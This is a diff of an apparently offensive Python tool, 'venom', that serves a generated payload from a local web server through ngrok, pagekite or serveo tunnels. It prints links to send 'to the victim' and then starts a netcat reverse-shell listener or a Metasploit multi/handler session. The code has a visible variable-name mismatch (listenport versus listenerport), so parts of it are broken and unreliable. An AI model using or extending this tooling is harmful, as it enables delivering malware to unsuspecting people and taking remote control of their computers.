@@ -116,13 +116,15 @@ def venom():
                   auth=input(" ENTER THE STRING AUTHTOKEN ALONE(without './ngrok authtoken 'phrase : ")
                   os.system(f"./ngrok authtoken {auth}")
                   os.system("./ngrok http 80")
+                  print("#######HAPPY HACKING#############")
             
             else:
                print("NICE , you have an account in ngrok...")
                if os.path.isfile("/root/.ngrok2/ngrok.yml"):
                    print(f"send the ngrok link/{name} and send to the victim..!!")
                    print(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}")
-                   os.system("./ngrok http 80")               
+                   os.system("./ngrok http 80")
+                   print("#######HAPPY HACKING#############")
                else:
                    print("YOUR SYSTEM IS NOT CONFIGURED NGROK PROPERLY...")
                    print("PLEASE LOGIN YOUR NGROK ACCOUNT AND COPY THE AUTHTOKEN ALONE :")
@@ -133,6 +135,7 @@ def venom():
                    input(f"send the ngrok link/{name} and send to the victim..!!('enter to continue!)")
                    input(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}(enter to continue)")
                    os.system("./ngrok http 80")
+                   print("#######HAPPY HACKING#############")
                          
       elif link==2:
            os.system(f"cp {output}/{name} /var/www/html")
@@ -149,9 +152,9 @@ def venom():
            print(" ")
            os.system("service apache2 start")
            os.system(f"pagekite {pkname}.pagekite.me")
-            
-            
+           print("#######HAPPY HACKING#############")
       elif link==3:
+           os.system(f"cp {output}/{name} /var/www/html")
            print("[1] DEFAULT URL (https://frvenom.serveo.net)")
            print("[2] MAKE YOUR OWN CUSTOM DOMAIN NAME(eg:https://yourname.serveo.net)")
            serveo=int(input("Enter the choice: "))
@@ -160,16 +163,20 @@ def venom():
               print(f"https://frvenom.serveo.net/{name}")
               print("SERVER STARTED.......")
               os.system("ssh -R frvenom.serveo.net:80:localhost:80 serveo.net")
+              print("#######HAPPY HACKING#############")
            elif serveo==2:
                 domain=input("ENTER ANY NAME OF YOUR CHOICE : ")
                 print(f"send this URL to the victim >>>> https://{domain}.serveo.net/{name}  ")
                 print("SERVER STARTED.......")
                 os.system(f"ssh -R {domain}.serveo.net:80:localhost:80 serveo.net")
+                print("#######HAPPY HACKING#############")
            else:
                print("USING DEFAULT URL...")
                print(f"SEND THIS URL TO THE VICTIM >>>>> https://frvenom.serveo.net/{name}")
                os.system("ssh -R frvenom.serveo.net:80:localhost:80 serveo.net")
+               print("#######HAPPY HACKING#############")
       else:
+           os.system(f"cp {output}/{name} /var/www/html")
            print("NO INPUT ENTERED BY USER,,,,,,USING DEFAULT URL....")
            print("SEND THE BELOW URL TO THE VICTIM....>>")
            print(f"https://frvenom.serveo.net/{name}")
@@ -179,10 +186,42 @@ def venom():
     elif server=="n" or server=="N":
         exiting=input("ANY KEY TO EXIT....")
         print("##########  HAPPY HACKING ###########")
-   
-        
-
-
+    
+    os.system(f"rm /var/www/html/{name}")
+    msf=input("do you want to start listener/Metasploit?[y/n]: ")
+    if msf=="y" or msf=="Y":
+        print("[1] FEBREV REVERSE TCP SHELL LISTENER(for reverse tcp payload only)")
+        print("[2] METASPLOIT")
+        print("[0] EXIT")
+        listener=int(input("ENTER YOUR CHOICE: "))
+        if listener==1:
+           print(""" 
+             __      _                         _ _     _                       
+            / _| ___| |__  _ __ _____   __    | (_)___| |_ ___ _ __   ___ _ __ 
+           | |_ / _ \ '_ \| '__/ _ \ \ / /____| | / __| __/ _ \ '_ \ / _ \ '__|
+           |  _|  __/ |_) | | |  __/\ V /_____| | \__ \ ||  __/ | | |  __/ |   
+           |_|  \___|_.__/|_|  \___| \_/      |_|_|___/\__\___|_| |_|\___|_|   
+                                                                    
+            
+           """)
+           listenport=input("ENTER THE LPORT: ")
+           print("ctrl-c to stop listener")
+           os.system(f"nc -lvp {listenerport}")
+           print("######HAPPY HACKING##########")
+        elif listener==2:
+             print("ENTER THE BELOW COMMANDS ONE BY ONE IN METASPLOIT")
+             print("command1 : use exploit/multi/handler")
+             print("command2 : set payload <YOUR PAYLOAD >")
+             print(f"command3 : set LHOST {lhost}")
+             print(f"command4 : set LPORT {lport}")
+             os.system("service postgresql start")
+             os.system("msfconsole")
+        else:
+             print("EXITING.....BYE BYE>>>>")
+             os.system("exit")
+              
+    
+    
 
 if __name__=="__main__":
     venom()
